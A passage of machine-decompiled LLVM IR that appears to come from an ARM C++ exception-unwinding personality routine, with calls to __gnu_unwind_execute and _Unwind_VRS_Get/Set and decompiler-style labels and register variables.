dec_label_pc_1a6f8:                               ; preds = %dec_label_pc_1a90c, %dec_label_pc_1a8d0, %dec_label_pc_1a6e8, %dec_label_pc_1a638.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_1a638.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a6e8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a8d0 ], [ %stack_var_-76.4, %dec_label_pc_1a90c ]
  %v0_1a6f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a6f8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_1a700 = call i32 @__gnu_unwind_execute(i32 %v0_1a6f8, %anon_struct_13* %tmp156)
  store i32 %v4_1a700, i32* %r0.global-to-local, align 4
  store i32 %v4_1a700, i32* %r5.global-to-local, align 4
  %v2_1a704 = icmp eq i32 %v4_1a700, 0
  br i1 %v2_1a704, label %dec_label_pc_1a70c, label %dec_label_pc_1a788

dec_label_pc_1a70c:                               ; preds = %dec_label_pc_1a6f8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_1a710 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_1a710, label %bb157, label %dec_label_pc_1a71c

bb157:                                            ; preds = %dec_label_pc_1a70c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1a71c:                               ; preds = %dec_label_pc_1a70c
  %v2_1a71c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1a71c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a72c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a72c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_1a734 = call i32 @_Unwind_VRS_Get(i32 %v0_1a72c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_1a738 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_1a72c, i32* %r0.global-to-local, align 4
  %v5_1a74c = call i32 @_Unwind_VRS_Set(i32 %v0_1a72c, i32 %v0_1a738, i32 14, i32 %v0_1a738, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a74c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v4_1a758 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 32) to i32*), align 4
  %v0_1a75c = load i32, i32* %r5.global-to-local, align 4
  %v0_1a760 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a760, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_1a758, i32* %stack_var_-48, align 4
  %v5_1a774 = call i32 @_Unwind_VRS_Set(i32 %v0_1a760, i32 %v0_1a75c, i32 15, i32 %v0_1a75c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1a780:                               ; preds = %dec_label_pc_1a6cc
  %v7_1a780 = icmp eq i32 %v4_1a6c0, 2
  br i1 %v7_1a780, label %dec_label_pc_1a798, label %dec_label_pc_1a788

dec_label_pc_1a788:                               ; preds = %dec_label_pc_1a780, %dec_label_pc_1a86c, %dec_label_pc_1a6f8, %dec_label_pc_1aa60
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1a78c:                               ; preds = %bb157, %dec_label_pc_1aa98, %dec_label_pc_1aa28, %bb166, %dec_label_pc_1a71c, %dec_label_pc_1a788
  %v1_1a794 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_1aa98 ], [ %v1_1a794.pre, %dec_label_pc_1aa28 ], [ 7, %bb166 ], [ 7, %dec_label_pc_1a71c ], [ 9, %dec_label_pc_1a788 ]
  store i32 %v3_1a5a8, i32* %r4.global-to-local, align 4
  store i32 %v6_1a5a8, i32* %r5.global-to-local, align 4
  ret i32 %v1_1a794

dec_label_pc_1a798:                               ; preds = %dec_label_pc_1a780
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  %v0_1a79c = load i32, i32* @r7, align 4
  %v1_1a79c = inttoptr i32 %v0_1a79c to i32*
  %v2_1a79c = load i32, i32* %v1_1a79c, align 4
  %tmp206 = bitcast i32 %v2_1a79c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_1a7a4 = bitcast float %tmp207 to i32
  store i32 %v1_1a7a4, i32* @sl, align 4
  br i1 %v2_1a6d4, label %dec_label_pc_1a7ac, label %dec_label_pc_1a918

dec_label_pc_1a7ac:                               ; preds = %dec_label_pc_1a798
  %v2_1a7ac = icmp eq i32 %v0_1a864, 0
  br i1 %v2_1a7ac, label %dec_label_pc_1a900, label %dec_label_pc_1a7b4

dec_label_pc_1a7b4:                               ; preds = %dec_label_pc_1a7ac
  %v2_1a7b8 = icmp eq i32 %v1_1a7a4, 0
  br i1 %v2_1a7b8, label %dec_label_pc_1a7c4.thread, label %bb159

dec_label_pc_1a7c4.thread:                        ; preds = %dec_label_pc_1a7b4
  br label %dec_label_pc_1aa28

bb159:                                            ; preds = %dec_label_pc_1a7b4
  br i1 %v3_1a7bc, label %dec_label_pc_1a7cc, label %dec_label_pc_1a900

dec_label_pc_1a7cc:                               ; preds = %bb159
  %v1_1a7cc = add i32 %v0_1a79c, 4
  store i32 %v1_1a7cc, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1a7dc = load i32, i32* @r8, align 4
  %v1_1a7dc = add i32 %v0_1a7dc, 88
  store i32 %v1_1a7dc, i32* %sb.global-to-local, align 4
  store i32 %v1_1a7cc, i32* @r4, align 4
  br label %dec_label_pc_1a800

dec_label_pc_1a7f0:                               ; preds = %bb161
  %v1_1a7f0 = add i32 %v0_1a7f0, 1
  store i32 %v1_1a7f0, i32* @r5, align 4
  %v1_1a7f4 = load i32, i32* @sl, align 4
  %v9_1a7f4 = icmp eq i32 %v1_1a7f0, %v1_1a7f4
  %v0_1a7f8 = load i32, i32* @r4, align 4
  %v1_1a7f8 = add i32 %v0_1a7f8, 4
  store i32 %v1_1a7f8, i32* @r4, align 4
  br i1 %v9_1a7f4, label %dec_label_pc_1aa28, label %dec_label_pc_1a7f0.dec_label_pc_1a800_crit_edge

dec_label_pc_1a7f0.dec_label_pc_1a800_crit_edge:  ; preds = %dec_label_pc_1a7f0
  %v0_1a80c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1a800

dec_label_pc_1a800:                               ; preds = %dec_label_pc_1a7f0.dec_label_pc_1a800_crit_edge, %dec_label_pc_1a7cc
  %v0_1a80c = phi i32 [ %v0_1a80c.pre, %dec_label_pc_1a7f0.dec_label_pc_1a800_crit_edge ], [ %v1_1a7dc, %dec_label_pc_1a7cc ]
  %v1_1a810 = phi i32 [ %v1_1a7f8, %dec_label_pc_1a7f0.dec_label_pc_1a800_crit_edge ], [ %v1_1a7cc, %dec_label_pc_1a7cc ]
  %v1_1a800 = inttoptr i32 %v1_1a810 to i32*
  %v2_1a800 = load i32, i32* %v1_1a800, align 4
  %v2_1a804 = icmp eq i32 %v2_1a800, 0
  store i32 %v0_1a80c, i32* %forced_unwind_-44, align 4
  br i1 %v2_1a804, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_1a800
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_1a800, %bb160
  %v0_1a814 = load i32, i32* @r8, align 4
  store i32 %v0_1a814, i32* %r0.global-to-local, align 4
  store i32 %v2_1a8a0, i32* %r2.global-to-local, align 4
  %v4_1a824 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 100) to i32*), align 4
  store i32 108592, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a824)
  %v0_1a830 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a830 = icmp eq i32 %v0_1a830, 0
  %v0_1a7f0 = load i32, i32* @r5, align 4
  br i1 %v2_1a830, label %dec_label_pc_1a7f0, label %dec_label_pc_1a838

dec_label_pc_1a838:                               ; preds = %bb161
  %v1_1a838 = load i32, i32* @sl, align 4
  %v9_1a838 = icmp eq i32 %v0_1a7f0, %v1_1a838
  br i1 %v9_1a838, label %dec_label_pc_1aa28, label %dec_label_pc_1a840

dec_label_pc_1a840:                               ; preds = %dec_label_pc_1a838
  %v0_1a840 = load i32, i32* @r7, align 4
  %v1_1a840 = inttoptr i32 %v0_1a840 to i32*
  %v2_1a840 = load i32, i32* %v1_1a840, align 4
  %v1_1a844 = icmp slt i32 %v2_1a840, 0
  %v0_1a84c.pre = load i32, i32* @r6, align 4
  br i1 %v1_1a844, label %dec_label_pc_1a84c, label %dec_label_pc_1a90c

dec_label_pc_1a84c:                               ; preds = %dec_label_pc_1a840, %dec_label_pc_1a904
  %v0_1a84c = phi i32 [ %storemerge, %dec_label_pc_1a904 ], [ %v0_1a84c.pre, %dec_label_pc_1a840 ]
  store i32 %v0_1a84c, i32* %r0.global-to-local, align 4
  %v1_1a850 = add i32 %v0_1a84c, 4
  store i32 %v1_1a850, i32* @r6, align 4
  br label %dec_label_pc_1a90c

dec_label_pc_1a858:                               ; preds = %bb154
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  br i1 %v2_1a6d4, label %dec_label_pc_1a864, label %dec_label_pc_1a950

dec_label_pc_1a864:                               ; preds = %dec_label_pc_1a858
  %v2_1a864 = icmp eq i32 %v0_1a864, 0
  br i1 %v2_1a864, label %dec_label_pc_1a8d0, label %dec_label_pc_1a86c

dec_label_pc_1a86c:                               ; preds = %dec_label_pc_1a864
  %v0_1a86c = load i32, i32* @r7, align 4
  %v1_1a86c = add i32 %v0_1a86c, 4
  %v2_1a86c = inttoptr i32 %v1_1a86c to i32*
  %v3_1a86c = load i32, i32* %v2_1a86c, align 4
  %v7_1a870 = icmp eq i32 %v3_1a86c, -2
  store i32 %v1_1a86c, i32* %r2.global-to-local, align 4
  br i1 %v7_1a870, label %dec_label_pc_1a788, label %dec_label_pc_1a87c

dec_label_pc_1a87c:                               ; preds = %dec_label_pc_1a86c
  %v0_1a87c = load i32, i32* @r8, align 4
  %v1_1a87c = add i32 %v0_1a87c, 88
  %v7_1a880 = icmp eq i32 %v3_1a86c, -1
  store i32 %v1_1a87c, i32* %forced_unwind_-44, align 4
  br i1 %v7_1a880, label %dec_label_pc_1a8c4, label %dec_label_pc_1a88c

dec_label_pc_1a88c:                               ; preds = %dec_label_pc_1a87c
  %v2_1a890 = icmp eq i32 %v3_1a86c, 0
  br i1 %v2_1a890, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1a88c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1a88c, %bb162
  store i32 %v0_1a87c, i32* %r0.global-to-local, align 4
  store i32 %v2_1a8a0, i32* %r2.global-to-local, align 4
  %v4_1a8ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 100) to i32*), align 4
  store i32 108728, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a8ac)
  %v0_1a8b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a8b8 = icmp eq i32 %v0_1a8b8, 0
  br i1 %v2_1a8b8, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_1a8c4.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1a8c4

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1a8d0

dec_label_pc_1a8c4:                               ; preds = %.thread25, %dec_label_pc_1a87c
  %v3_1a8c4 = phi i32 [ %v3_1a8c4.pr, %.thread25 ], [ %v1_1a87c, %dec_label_pc_1a87c ]
  %v2_1a8c8 = icmp eq i32 %v3_1a8c4, 0
  br i1 %v2_1a8c8, label %dec_label_pc_1a8d0, label %dec_label_pc_1aa28

dec_label_pc_1a8d0:                               ; preds = %bb164, %dec_label_pc_1a97c, %dec_label_pc_1a950, %dec_label_pc_1a8c4, %dec_label_pc_1a864
  %v0_1a8d0 = load i32, i32* @r7, align 4
  %v1_1a8d0 = add i32 %v0_1a8d0, 8
  %v1_1a638 = inttoptr i32 %v1_1a8d0 to i32*
  %v2_1a638 = load i32, i32* %v1_1a638, align 4
  %v2_1a63c = icmp eq i32 %v2_1a638, 0
  br i1 %v2_1a63c, label %dec_label_pc_1a6f8, label %dec_label_pc_1a644.preheader

dec_label_pc_1a8d8:                               ; preds = %entry
  %v3_1a8d8 = udiv i32 %v2_1a5cc, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_1a8e8 = mul nuw nsw i32 %v3_1a8d8, 4
  %v3_1a8ec = mul i32 %v2_1a5cc, 65536
  %v2_1a8f0 = add i32 %v6_1a8e8, %v4_1a5cc
  store i32 %v3_1a8ec, i32* %v4_1a5ec, align 8
  br label %dec_label_pc_1a614

dec_label_pc_1a900:                               ; preds = %bb159, %dec_label_pc_1a7ac
  %v1_1a900 = add i32 %v0_1a79c, 4
  br label %dec_label_pc_1a904

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a944, %dec_label_pc_1a900
  %v0_1a904 = phi i32 [ %v2_1a944, %dec_label_pc_1a944 ], [ %v2_1a79c, %dec_label_pc_1a900 ]
  %storemerge = phi i32 [ %v4_1a944, %dec_label_pc_1a944 ], [ %v1_1a900, %dec_label_pc_1a900 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_1a904 = icmp slt i32 %v0_1a904, 0
  br i1 %v1_1a904, label %dec_label_pc_1a84c, label %dec_label_pc_1a90c

dec_label_pc_1a90c:                               ; preds = %dec_label_pc_1a840, %dec_label_pc_1a904, %dec_label_pc_1aa18, %dec_label_pc_1a84c
  %v0_1a910 = phi i32 [ %v1_1a850, %dec_label_pc_1a84c ], [ %storemerge, %dec_label_pc_1a904 ], [ %v1_1aa1c, %dec_label_pc_1aa18 ], [ %v0_1a84c.pre, %dec_label_pc_1a840 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1a84c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a904 ], [ %v1_1aa18, %dec_label_pc_1aa18 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a840 ]
  %v0_1a90c = load i32, i32* @sl, align 4
  %v3_1a90c = mul i32 %v0_1a90c, 4
  %v2_1a910 = add i32 %v3_1a90c, %v0_1a910
  %v1_1a63865 = inttoptr i32 %v2_1a910 to i32*
  %v2_1a63866 = load i32, i32* %v1_1a63865, align 4
  %v2_1a63c68 = icmp eq i32 %v2_1a63866, 0
  br i1 %v2_1a63c68, label %dec_label_pc_1a6f8, label %dec_label_pc_1a644.preheader.lr.ph

dec_label_pc_1a918:                               ; preds = %dec_label_pc_1a798
  %v0_1a928 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a928, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a930 = load i32, i32* @r8, align 4
  %v1_1a930 = add i32 %v0_1a930, 32
  %v2_1a930 = inttoptr i32 %v1_1a930 to i32*
  %v3_1a930 = load i32, i32* %v2_1a930, align 4
  store i32 %v3_1a930, i32* @r4, align 4
  %v5_1a934 = call i32 @_Unwind_VRS_Get(i32 %v0_1a928, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a934, i32* %r0.global-to-local, align 4
  %v3_1a938 = load i32, i32* %stack_var_-48, align 4
  %v0_1a93c = load i32, i32* @r4, align 4
  %v9_1a93c = icmp eq i32 %v0_1a93c, %v3_1a938
  br i1 %v9_1a93c, label %dec_label_pc_1a9e4, label %dec_label_pc_1a918.dec_label_pc_1a944_crit_edge

dec_label_pc_1a918.dec_label_pc_1a944_crit_edge:  ; preds = %dec_label_pc_1a918
  %v0_1a944.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a944

dec_label_pc_1a944:                               ; preds = %dec_label_pc_1a918.dec_label_pc_1a944_crit_edge, %dec_label_pc_1a9e4
  %v0_1a944 = phi i32 [ %v0_1a944.pre, %dec_label_pc_1a918.dec_label_pc_1a944_crit_edge ], [ %v1_1a9e8, %dec_label_pc_1a9e4 ]
  %v1_1a944 = inttoptr i32 %v0_1a944 to i32*
  %v2_1a944 = load i32, i32* %v1_1a944, align 4
  %v4_1a944 = add i32 %v0_1a944, 4
  store i32 %v4_1a944, i32* @r7, align 4
  br label %dec_label_pc_1a904

dec_label_pc_1a950:                               ; preds = %dec_label_pc_1a858
  %v0_1a960 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a960, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a968 = load i32, i32* @r8, align 4
  %v1_1a968 = add i32 %v0_1a968, 32
  %v2_1a968 = inttoptr i32 %v1_1a968 to i32*
  %v3_1a968 = load i32, i32* %v2_1a968, align 4
  store i32 %v3_1a968, i32* @r4, align 4
  %v5_1a96c = call i32 @_Unwind_VRS_Get(i32 %v0_1a960, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a96c, i32* %r0.global-to-local, align 4
  %v3_1a970 = load i32, i32* %stack_var_-48, align 4
  %v0_1a974 = load i32, i32* @r4, align 4
  %v9_1a974 = icmp eq i32 %v0_1a974, %v3_1a970
  br i1 %v9_1a974, label %dec_label_pc_1a97c, label %dec_label_pc_1a8d0

dec_label_pc_1a97c:                               ; preds = %dec_label_pc_1a950
  %v0_1a97c = load i32, i32* @r8, align 4
  %v1_1a97c = add i32 %v0_1a97c, 40
  %v2_1a97c = inttoptr i32 %v1_1a97c to i32*
  %v3_1a97c = load i32, i32* %v2_1a97c, align 4
  %v1_1a980 = load i32, i32* @r7, align 4
  %v9_1a980 = icmp eq i32 %v3_1a97c, %v1_1a980
  br i1 %v9_1a980, label %dec_label_pc_1a988, label %dec_label_pc_1a8d0

dec_label_pc_1a988:                               ; preds = %dec_label_pc_1a97c
  %v1_1a988 = inttoptr i32 %v3_1a97c to i32*
  %v2_1a988 = load i32, i32* %v1_1a988, align 4
  %v1_1a98c = and i32 %v2_1a988, 1073741824
  %v2_1a98c = icmp eq i32 %v1_1a98c, 0
  br i1 %v2_1a98c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_1a988
  %v2_1a990 = or i32 %v2_1a988, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_1a988
  %tmp208 = bitcast i32 %v2_1a988 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_1a994 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_1a998 = phi i32 [ %v2_1aac8, %.thread28 ], [ %v2_1aac8, %bb169 ], [ %v3_1a97c, %bb165 ], [ %v3_1a97c, %.thread26 ]
  %v0_1a998 = phi i32 [ %v2_1aad8, %.thread28 ], [ %v2_1aad4, %bb169 ], [ %v2_1a990, %bb165 ], [ %v2_1a994, %.thread26 ]
  %v2_1a998 = add i32 %v0_1a998, %v1_1a998
  store i32 %v2_1a998, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a9b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a9b0, i32* %r0.global-to-local, align 4
  %v5_1a9b8 = call i32 @_Unwind_VRS_Set(i32 %v0_1a9b0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_1a9b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a9d0 = load i32, i32* @r8, align 4
  store i32 %v0_1a9d0, i32* %stack_var_-48, align 4
  %v5_1a9d8 = call i32 @_Unwind_VRS_Set(i32 %v0_1a9b0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1a9e4:                               ; preds = %dec_label_pc_1a918
  %v0_1a9e4 = load i32, i32* @r8, align 4
  %v1_1a9e4 = add i32 %v0_1a9e4, 40
  %v2_1a9e4 = inttoptr i32 %v1_1a9e4 to i32*
  %v3_1a9e4 = load i32, i32* %v2_1a9e4, align 4
  %v1_1a9e8 = load i32, i32* @r7, align 4
  %v9_1a9e8 = icmp eq i32 %v3_1a9e4, %v1_1a9e8
  br i1 %v9_1a9e8, label %dec_label_pc_1a9f0, label %dec_label_pc_1a944

dec_label_pc_1a9f0:                               ; preds = %dec_label_pc_1a9e4
  %v1_1a9f4 = add i32 %v3_1a9e4, 4
  store i32 %v1_1a9f4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1a9fc = add i32 %v0_1a9e4, 44
  %v3_1a9fc = inttoptr i32 %v2_1a9fc to i32*
  store i32 0, i32* %v3_1a9fc, align 4
  %v0_1aa00 = load i32, i32* %r2.global-to-local, align 4
  %v1_1aa00 = load i32, i32* @r8, align 4
  %v2_1aa00 = add i32 %v1_1aa00, 48
  %v3_1aa00 = inttoptr i32 %v2_1aa00 to i32*
  store i32 %v0_1aa00, i32* %v3_1aa00, align 4
  %v0_1aa04 = load i32, i32* @sl, align 4
  %v1_1aa04 = load i32, i32* @r8, align 4
  %v2_1aa04 = add i32 %v1_1aa04, 40
  %v3_1aa04 = inttoptr i32 %v2_1aa04 to i32*
  store i32 %v0_1aa04, i32* %v3_1aa04, align 4
  %v0_1aa08 = load i32, i32* %r0.global-to-local, align 4
  %v1_1aa08 = load i32, i32* @r8, align 4
  %v2_1aa08 = add i32 %v1_1aa08, 52
  %v3_1aa08 = inttoptr i32 %v2_1aa08 to i32*
  store i32 %v0_1aa08, i32* %v3_1aa08, align 4
  %v0_1aa0c = load i32, i32* @r7, align 4
  %v1_1aa0c = inttoptr i32 %v0_1aa0c to i32*
  %v2_1aa0c = load i32, i32* %v1_1aa0c, align 4
  %v1_1aa10 = icmp slt i32 %v2_1aa0c, 0
  br i1 %v1_1aa10, label %dec_label_pc_1aa18, label %dec_label_pc_1aac4

dec_label_pc_1aa18:                               ; preds = %dec_label_pc_1a9f0
  %v0_1aa18 = load i32, i32* %r2.global-to-local, align 4
  %v1_1aa18 = add i32 %v0_1aa18, -3
  store i32 %v1_1aa18, i32* %r2.global-to-local, align 4
  %v0_1aa1c = load i32, i32* %r0.global-to-local, align 4
  %v1_1aa1c = add i32 %v0_1aa1c, 4
  store i32 %v1_1aa1c, i32* @r6, align 4
  br label %dec_label_pc_1a90c

dec_label_pc_1aa28:                               ; preds = %dec_label_pc_1a838, %dec_label_pc_1a8c4, %dec_label_pc_1a7f0, %dec_label_pc_1a7c4.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1aa38 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1aa38, i32* %r0.global-to-local, align 4
  %v5_1aa40 = call i32 @_Unwind_VRS_Get(i32 %v0_1aa38, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1aa44 = load i32, i32* @r7, align 4
  %v1_1aa44 = load i32, i32* @r8, align 4
  %v2_1aa44 = add i32 %v1_1aa44, 40
  %v3_1aa44 = inttoptr i32 %v2_1aa44 to i32*
  store i32 %v0_1aa44, i32* %v3_1aa44, align 4
  %v3_1aa48 = load i32, i32* %stack_var_-48, align 4
  %v3_1aa4c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1aa4c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_1aa54 = load i32, i32* @r8, align 4
  %v2_1aa54 = add i32 %v1_1aa54, 32
  %v3_1aa54 = inttoptr i32 %v2_1aa54 to i32*
  store i32 %v3_1aa48, i32* %v3_1aa54, align 4
  %v0_1aa58 = load i32, i32* %r2.global-to-local, align 4
  %v1_1aa58 = load i32, i32* @r8, align 4
  %v2_1aa58 = add i32 %v1_1aa58, 36
  %v3_1aa58 = inttoptr i32 %v2_1aa58 to i32*
  store i32 %v0_1aa58, i32* %v3_1aa58, align 4
  %v1_1a794.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1aa60:                               ; preds = %bb155
  %v1_1aa60 = inttoptr i32 %v0_1a6e8 to i32*
  %v2_1aa60 = load i32, i32* %v1_1aa60, align 4
  %v1_1aa64 = add i32 %v0_1a6e8, 4
  %v1_1aa68 = and i32 %v2_1aa60, 1073741824
  %v2_1aa68 = icmp eq i32 %v1_1aa68, 0
  %v2_1aa6c = or i32 %v2_1aa60, -2147483648
  %tmp210 = bitcast i32 %v2_1aa60 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_1aa70 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_1aa68, i32 %v2_1aa70, i32 %v2_1aa6c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_1aa74 = load i32, i32* @r8, align 4
  %v2_1aa74 = add i32 %v1_1aa74, 56
  %v3_1aa74 = inttoptr i32 %v2_1aa74 to i32*
  store i32 %v1_1aa64, i32* %v3_1aa74, align 4
  %v0_1aa78 = load i32, i32* @r8, align 4
  store i32 %v0_1aa78, i32* %r0.global-to-local, align 4
  %v4_1aa84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 28) to i32*), align 4
  store i32 109200, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1aa84)
  %v0_1aa90 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aa90 = icmp eq i32 %v0_1aa90, 0
  br i1 %v2_1aa90, label %dec_label_pc_1a788, label %dec_label_pc_1aa98

dec_label_pc_1aa98:                               ; preds = %dec_label_pc_1aa60
  %v0_1aa98 = load i32, i32* %r4.global-to-local, align 4
  %v1_1aa98 = load i32, i32* @r7, align 4
  %v2_1aa98 = add i32 %v1_1aa98, %v0_1aa98
  store i32 %v2_1aa98, i32* %stack_var_-48, align 4
  %v0_1aaa8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1aaa8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_1aab8 = call i32 @_Unwind_VRS_Set(i32 %v0_1aaa8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1aac4:                               ; preds = %dec_label_pc_1a9f0
  %v0_1aac4 = load i32, i32* @sl, align 4
  %v3_1aac4 = mul i32 %v0_1aac4, 4
  %v0_1aac8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aac8 = add i32 %v0_1aac8, %v3_1aac4
  %v3_1aac8 = inttoptr i32 %v2_1aac8 to i32*
  %v4_1aac8 = load i32, i32* %v3_1aac8, align 4
  %v1_1aacc = and i32 %v4_1aac8, 1073741824
  %v2_1aacc = icmp eq i32 %v1_1aacc, 0
  br i1 %v2_1aacc, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_1aac4
  %v2_1aad4 = or i32 %v4_1aac8, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_1aac4
  %tmp212 = bitcast i32 %v4_1aac8 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_1aad8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_1aac8, { 2, 1, 0 }
  uselistorder i32 %v1_1aa1c, { 1, 0 }
  uselistorder i32 %v1_1aa18, { 1, 0 }
  uselistorder i32 %v1_1a9e8, { 1, 0 }
  uselistorder i32 %v0_1a9b0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1a97c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a944, { 1, 0 }
  uselistorder i32 %v0_1a944, { 1, 0 }
  uselistorder i32 %v2_1a63866, { 1, 0 }
  uselistorder i32 %v2_1a910, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_1a638, { 1, 0 }
  uselistorder i32 %v1_1a8d0, { 1, 0 }
  uselistorder i32 %v3_1a86c, { 2, 0, 1 }
  uselistorder i32 %v0_1a84c, { 1, 0 }
  uselistorder i32 %v0_1a84c.pre, { 1, 0 }
  uselistorder i32 %v1_1a7a4, { 1, 0 }
  uselistorder i32 %v2_1a79c, { 1, 0 }
  uselistorder i32 %v0_1a72c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1a6ec, { 1, 0 }
  uselistorder i32 %v1_1a6e8, { 1, 0 }
  uselistorder i32 %v0_1a6e8, { 1, 0, 2 }
  uselistorder i32 %v4_1a6c0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a864, { 1, 2, 0 }
  uselistorder i32 %v0_1a698, { 1, 0 }
  uselistorder i32 %v3_1a694, { 1, 0, 2 }
  uselistorder i32 %v1_1a668, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_1a8a0, { 1, 0 }
  uselistorder i1 %v2_1a6d4, { 1, 0, 2 }
  uselistorder i32 %v1_1a5d8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
